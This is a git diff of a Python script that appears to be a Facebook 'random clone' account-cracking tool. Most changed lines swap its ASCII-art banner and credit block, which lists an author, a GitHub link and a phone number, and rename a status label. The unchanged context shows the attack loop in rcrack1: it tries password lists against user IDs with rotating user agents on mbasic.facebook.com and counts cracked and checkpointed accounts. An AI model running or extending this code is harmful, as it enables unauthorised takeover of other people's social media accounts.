@@ -70,20 +70,23 @@ for xd in range(10000):
     ugen.append(uaku2)
 os.system('xdg-open https://github.com/MohammedFarouq/cloning-.git')
 logo = ("""
-\033[1;91m    |      /          /\              |                    |
-\033[1;92m    |    /          /    \            |                    |
-\033[1;93m    |  /          /--------\          |                    |
-\033[1;94m    |  \        /            \        |                    |
-\033[1;95m    |    \    /                \      |_______        |                 \033[1;92m
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mHACKCODEß           ┃
- ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
- ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
- ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [✓] GITHUB    \033[1;91m: \033[1;92mhttps://github.com/MohammedFarouq.git   ┃
- ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mKali Linux     ┃
- ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+2348120395847        ┃
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
+\033[1;91m ##                     ##           ##                     ##########
+\033[1;92m ##                     ##          ##                     ##
+\033[1;93m ##                     ##         ##                      ##
+\034[1;94m ## ##########         ##                      ##########
+\033[1;95m ##                    ##         ##                      ## 
+\033[1;96m ##                    ##        ##                       ##
+\033[1;97m ##                    ##       ##                        ##     
+\033[1;98m ##                    ##      ##########     ##                         \033[1;92m
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+ ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mMohammed Farouq ┃
+ ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE        ┃
+ ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                            ┃
+ ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI              ┃
+ ┃ [✓] GITHUB    \033[1;91m: \033[1;92mHackercodeß.            ┃
+ ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mKali Linux.              ┃
+ ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+2348120395847     ┃
+ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 class Main:
     def __init__(self):
@@ -185,7 +188,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mINNOCENT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mHLF\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
